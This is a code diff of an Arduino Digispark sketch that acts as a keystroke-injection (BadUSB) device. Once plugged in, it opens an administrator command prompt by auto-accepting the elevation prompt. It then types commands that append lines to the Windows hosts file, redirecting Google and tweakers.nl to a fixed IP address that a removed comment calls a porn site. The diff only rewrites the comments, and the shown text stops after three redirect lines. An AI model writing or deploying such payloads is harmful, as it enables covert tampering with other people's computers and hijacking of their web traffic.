@@ -1,16 +1,18 @@
 #include "DigiKeyboard.h"
+
 void setup() {
+
 }
 
 void loop() {
   DigiKeyboard.sendKeyStroke(0);
-//Opens an administrator command prompt
+//cmd as admin
   DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
   DigiKeyboard.sendKeyStroke(KEY_A);
   DigiKeyboard.delay(250);
   DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
   DigiKeyboard.delay(250);
-//Redirects popular sites to a porn site
+//redirects the listed urls to the ip address
   DigiKeyboard.println("ECHO 199.80.54.63 www.google.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
   DigiKeyboard.println("ECHO 199.80.54.63 google.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
   DigiKeyboard.println("ECHO 199.80.54.63 www.tweakers.nl >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
